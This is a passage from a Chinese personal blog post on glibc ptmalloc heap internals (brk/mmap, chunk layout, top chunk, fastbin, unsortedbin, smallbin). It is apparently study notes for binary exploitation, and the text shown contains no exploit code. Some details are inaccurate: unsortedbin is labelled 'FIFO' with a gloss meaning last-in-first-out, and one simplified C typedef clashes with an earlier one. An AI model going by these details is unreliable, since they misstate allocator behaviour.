<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="LightCloveyou,PWN">
    
    <meta name="author" content="LightCloveyou">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://LightCloveyou.github.io/unpublic/heap-all-in-one.html"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:type" content="website">
<meta property="og:title" content="heap-all-in-one">
<meta property="og:url" content="https://lightcloveyou.github.io/unpublic/heap-all-in-one.html">
<meta property="og:site_name" content="LightCloveyou&#39;s Blog">
<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lightcloveyou.github.io/images/redefine-og.webp">
<meta property="article:published_time" content="2025-10-30T06:21:58.000Z">
<meta property="article:modified_time" content="2025-11-15T17:14:52.908Z">
<meta property="article:author" content="LightCloveyou">
<meta property="article:tag" content="LightCloveyou,PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lightcloveyou.github.io/images/redefine-og.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            heap-all-in-one | LightCloveyou&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    
        
            
    
            
    
            
                
                    <script data-swup-reload-script>
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      displayMath: [['$$', '$$'], ['\\[', '\\]']],
      processEscapes: true,
      processEnvironments: true,  # 启用多行公式环境处理
      packages: {'[+]': ['ams']}
    },
    options: {
      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
    }
  };
</script>

                
    
            
                
                    <script data-swup-reload-script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
                
    
            
                
                    <style>
  /* 修复公式换行和滚动条问题 */
  mjx-container[jax="CHTML"][display="true"] {
    display: block;
    text-align: center;
    margin: 1em 0;
    overflow-x: visible !important;
  }
  mjx-container[jax="CHTML"] {
    overflow-x: visible !important;
    overflow-y: visible !important;
  }
  mjx-container > svg {
    overflow: visible !important;
  }
</style>

                
    
            
                
                    <script data-swup-reload-script>
  // 解决单页加载导致公式丢失的问题
  document.addEventListener("swup:contentReplaced", () => {
    if (window.MathJax) MathJax.typesetPromise();
  });
</script>

                
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"lightcloveyou.github.io","root":"/","language":"zh-CN"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.6,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome","subtitle":{"text":["Learning never stops","Powered by Hexo + Redefine"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#ddd"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/09/20 11:45:14"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 8.0.0"></head>



<body>
	<div class="progress-bar-container">
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                LightCloveyou&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/about"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/about"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="page-template-container">
	

	

	<div class="page-template-content markdown-body">
		
		<h1>heap-all-in-one</h1>
		

		<h2 id="堆的结构和管理">堆的结构和管理</h2>
<h3 id="ptmalloc">ptmalloc</h3>
<h4 id="brk">brk</h4>
<p><strong>int brk(const void *addr)</strong> 参数为新的堆顶，返回值：成功返回<code>0</code>，否则为<code>-1</code> #### sbrk <strong>void* sbrk(intptr_t incr)</strong> 参数为堆增加的大小（可以是负数和零），返回新的堆顶的地址 #### mmap <strong>void *mmap(void *addr, size_z length, int prot,int flags,int fd, off_t offset) </strong></p>
<p>其中，参数的含义如下： - <code>start</code>：映射区的开始地址，通常设置为<code>NULL</code>，表示由系统确定地址。 - <code>length</code>：映射区的长度。 * <code>prot</code>：映射区的保护权限，可以是<code>PROT_EXEC</code>、<code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_NONE</code>的组合。 - <code>flags</code>：影响映射区域的各种特性，如<code>MAP_SHARED</code>、<code>MAP_PRIVATE</code>、<code>MAP_FIXED</code>等。 - <code>fd</code>：要映射到内存中的文件描述符，通常由<code>open</code>函数返回。 - <code>offset</code>：文件映射的偏移量，通常设置为<code>0</code>。</p>
<p>成功返回被映射区的指针，失败时返回<code>MAP_FAILED</code> #### munmap <strong>int munmap(void *addr, size_t length)</strong></p>
<p>参数<code>start</code>是<code>mmap</code>返回的地址，<code>length</code>是映射区的大小</p>
<p>成功执行时返回<code>0</code>，失败时返回<code>-1</code></p>
<p><strong>mmap()和brk()/sbrk()这两种不同方式申请的堆内存是互相独立的，各自管理不同的内存区域，使用mmap时并不会自动调整brk指针</strong></p>
<h3 id="chunk">chunk</h3>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span>    </span><br><span class="line">  INTERNAL_SIZE_T      prev_size;    <span class="comment">/* Size of previous chunk (if free).  */</span>    </span><br><span class="line">  INTERNAL_SIZE_T      size;         <span class="comment">/* Size in bytes, including overhead. */</span>    </span><br><span class="line">    </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>           <span class="comment">/* double links -- used only if free. */</span>    </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span>    </span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span>    </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>      <span class="comment">/* double links -- used only if free. */</span>    </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span>   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>下面我们来看 <code>chunk</code> 结构体，各个字段的具体的解释如下：</p>
<ul>
<li><strong>prev_size</strong>, 如果该 <code>chunk</code> 的 <strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong> 是空闲的话，那该字段记录的是前一个 <code>chunk</code> 的大小 (包括 <code>chunk</code> 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 <code>chunk</code> 指的是较低地址的 <code>chunk</code></strong> </li>
<li><strong>size</strong> ，该 <code>chunk</code> 的大小，大小必须是 <code>MALLOC_ALIGNMENT</code> 的整数倍。如果申请的内存大小不是 <code>MALLOC_ALIGNMENT</code> 的整数倍，会被转换满足大小的最小的 <code>MALLOC_ALIGNMENT</code> 的倍数，这通过 <code>request2size()</code> 宏完成。32 位系统中， <code>MALLOC_ALIGNMENT</code> 可能是 <code>4</code> 或 <code>8</code> ；64 位系统中，<code>MALLOC_ALIGNMENT</code> 是 <code>8</code>
<ul>
<li>该字段的低三个比特位对 <code>chunk</code> 的大小没有影响，它们从高到低分别表示</li>
<li><code>NON_MAIN_ARENA</code>，记录当前 <code>chunk</code> 是否不属于主线程，<code>1</code>表示不属于，<code>0</code>表示属于</li>
<li><code>IS_MAPPED</code>，记录当前 <code>chunk</code> 是否是由 <code>mmap</code> 分配的，M=1为<code>mmap</code>映射区域分配，<code>M=0</code>为<code>heap</code>区域分配</li>
<li><code>PREV_INUSE</code>，记录前一个 <code>chunk</code> 块是否被分配
<ul>
<li>一般来说，堆中第一个被分配的内存块的 <code>size</code> 字段的 <code>P</code>位都会被设置为 <code>1</code></li>
<li>当一个 <code>chunk</code> 的 <code>size</code> 的 <code>P</code> 位为 <code>0</code> 时，我们能通过 <code>prev_size</code> 字段来获取上一个 <code>chunk</code> 的大小以及地址</li>
<li><code>p=1</code>时，表示前一个<code>chunk</code>正在使用，<code>prev_size</code>无效</li>
</ul></li>
</ul></li>
<li><strong>fd，bk</strong>。 <code>chunk</code> 处于分配状态时，从 fd 字段开始是用户的数据。 <code>chunk</code> 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下
<ul>
<li><code>fd</code> 指向下一个（非物理相邻）空闲的 <code>chunk</code> 。</li>
<li><code>bk</code> 指向上一个（非物理相邻）空闲的 <code>chunk</code> 。</li>
<li>通过 <code>fd</code> 和 <code>bk</code> 可以将空闲的 <code>chunk</code> 块加入到空闲的 <code>chunk</code> 块链表进行统一管理。</li>
</ul></li>
<li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 <code>chunk</code> 空闲的时候才使用，不过其用于较大的 <code>chunk（large chunk）</code>
<ul>
<li><code>fd_nextsize</code> 指向前一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针。</li>
<li><code>bk_nextsize</code> 指向后一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针。</li>
<li>一般空闲的 <code>large chunk</code> 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
</ul></li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取用户数据部分的指针  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + 2 * sizeof(size_t)))  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 从用户数据指针获取chunk指针  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr*)((char*)(mem) - 2 * sizeof(size_t)))  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 获取下一个chunk的指针  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr*)((char*)(p) + ((p)-&gt;size &amp; ~0x7)))</span></span><br></pre></td></tr></table></figure></div>
<p><strong>我们称前两个字段称为 <code>chunk</code> header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处</strong></p>
<h3 id="top-chunk">top chunk</h3>
<ul>
<li>第一次使用<code>malloc</code>时向系统申请内存放入<code>top chunk</code>中，此时<code>av-&gt;top</code>会指向<code>top chunk</code>的<code>prev_size</code>位，然后从<code>top chunk</code>中切割一块<code>chunk</code></li>
<li>再次使用<code>malloc</code>时先判断<code>bins</code>中是否有符合要求的空闲堆，没有的话就从<code>top chunk</code>中切割一块，然后更新<code>main_arena</code>的<code>top</code>指针</li>
<li>如果申请的堆块大小大于<code>top chunk</code>大小，<code>top chunk</code>与<code>bins</code>中空闲的<code>chunk</code>合并，并查看合并的<code>top chunk</code>是否满足要求</li>
<li>以上都不满足则通过系统调用申请额外内存，拓展到<code>top chunk</code>中</li>
</ul>
<h3 id="bins">bins</h3>
<p><code>bin</code>是一个由<code>struct chunk</code>结构体组成的链表，负责管理<code>free chunk</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="comment">// 内存块结构定义  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span>  </span><br><span class="line">    <span class="type">size_t</span> prev_size;    <span class="comment">// 前一个块的大小  </span></span><br><span class="line">    <span class="type">size_t</span> size;         <span class="comment">// 当前块的大小  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">// 前向指针  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span> <span class="comment">// 后向指针  </span></span><br><span class="line">&#125; mchunkptr;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 分配器状态结构定义  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span>  </span><br><span class="line">    mchunkptr* fastbinsY[<span class="number">10</span>];  <span class="comment">// fast bins数组，简化为10个大小  </span></span><br><span class="line">    mchunkptr* unsorted_bin;   <span class="comment">// unsorted bin链表头  </span></span><br><span class="line">    mchunkptr* smallbins[<span class="number">64</span>];  <span class="comment">// small bins数组，简化为64个大小  </span></span><br><span class="line">    mchunkptr* largebins[<span class="number">64</span>];  <span class="comment">// large bins数组，简化为64个大小  </span></span><br><span class="line">    <span class="comment">// 其他管理信息  </span></span><br><span class="line">&#125; mstate;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 初始化malloc_state  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_malloc_state</span><span class="params">(mstate* state)</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;  </span><br><span class="line">        state-&gt;fastbinsY[i] = <span class="literal">NULL</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    state-&gt;unsorted_bin = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;  </span><br><span class="line">        state-&gt;smallbins[i] = <span class="literal">NULL</span>;  </span><br><span class="line">        state-&gt;largebins[i] = <span class="literal">NULL</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> #### fastbin - 大小：<code>0x20~0x80</code>（包括头） - 个数：<code>10</code>条链 - <code>fastbins</code>中<code>chunk</code>的<code>size</code>最后一位始终置<code>1</code>，这是为了防止<code>fastbin</code>中<code>chunk</code>的内存合并，以便快速分配 - 是单向链表，使用fd连接，添加和移除都是对链表头操作，<code>LIFO</code>（后进先出） - 在释放时只会对链表指针头部的<code>chunk</code>进行校验，也就是说连续重复释放同一个<code>chunk</code>才会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./fastbin1.png"
                      
                ></p>
<h4 id="unsortedbin">unsortedbin</h4>
<ul>
<li>大小：无限制</li>
<li>个数：<code>1</code>个链表</li>
<li>当用户释放的内存大于<code>max_fast</code>或者<code>fastbins</code>合并后的<code>chunk</code>都会首先进入<code>unsortedbin</code>上</li>
<li>是双向链表，<code>FIFO</code>（后进先出）</li>
</ul>
<h4 id="smallbin">smallbin</h4>
<ul>
<li>大小：小于<code>0x400</code></li>
<li>个数：<code>62</code>个</li>
<li>双向链表，<code>FIFO</code></li>
<li>释放<code>small chunk</code>时，先检查该<code>chunk</code>相邻的<code>chunk</code>是否为<code>free</code>，是的话就进行合并操作，合成成新的<code>chunk</code>，并从<code>smallbin</code>中移除，最后将新的<code>chunk</code>添加到<code>unsortedbin</code>中，之后<code>unsortedbin</code>进行整理后再添加到对应<code>bin</code>链上</li>
<li>放入<code>smallbin</code>的条件
<ul>
<li>符合大小范围</li>
<li>释放堆到<code>unsortedbin</code>，再申请一个不在<code>unsortedbin</code>和<code>smallbin</code>中的堆，这样先前被放入<code>unsortedbin</code>的堆就会被放入<code>smallbin</code></li>
<li><code>smallbin</code>被切割后，切割后的堆先被放入<code>unsortedbin</code>中，再申请一个堆，没有使<code>unsortedbin</code>中堆块被切割，那么<code>unsortedbin</code>中的堆就会被放入<code>smallbin</code></li>
</ul></li>
</ul>
<table>
<thead>
<tr class="header">
<th>下标</th>
<th>32位</th>
<th>64位</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr class="even">
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr class="odd">
<td>x</td>
<td>8x</td>
<td>16x</td>
</tr>
<tr class="even">
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody>
</table>
